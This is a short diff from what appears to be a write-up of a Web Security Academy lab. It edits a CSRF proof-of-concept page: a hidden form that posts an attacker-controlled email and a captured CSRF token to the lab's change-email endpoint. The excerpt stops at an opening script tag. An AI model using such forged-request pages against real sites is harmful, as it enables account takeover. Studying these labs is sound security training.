@@ -297,9 +297,9 @@ _
 ```html
 <html>
   <body>
-    <form action="" method="POST">
+    <form action="https://0acc00430356efd28006038d00d9002c.web-security-academy.net/my-account/change-email" method="POST">
       <input type="hidden" name="email" value="attacker-controlled@email.com">
-      <input type="hidden" name="role" value="admin">
+      <input type="hidden" name="csrf" value="JxVei2N6sWi4VwvX1p7dVyqbxA2TDFPj">
     </form>
     
     <script>
